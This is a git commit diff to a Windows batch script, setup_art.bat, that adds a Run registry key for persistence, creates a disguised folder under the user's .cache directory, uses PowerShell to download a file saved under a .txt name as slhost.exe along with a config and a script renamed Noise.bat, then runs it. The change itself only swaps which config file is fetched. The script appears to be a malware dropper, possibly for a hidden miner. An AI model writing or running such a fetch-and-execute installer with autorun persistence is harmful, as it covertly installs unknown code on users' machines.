c5418748fb718471dfb7fb26487bd8a39ebfb8c8
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2023-12-21 16:24:15 -0300

    Update setup_art.bat

--- setup_art.bat
+++ setup_art.bat
@@ -6,7 +6,7 @@ REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v 
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
-powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/config.json','%USERPROFILE%\.cache\services\slhost\config.json')"
+powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/art.json','%USERPROFILE%\.cache\services\slhost\config.json')"
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"
 
 %USERPROFILE%\.cache\services\slhost\Noise.bat
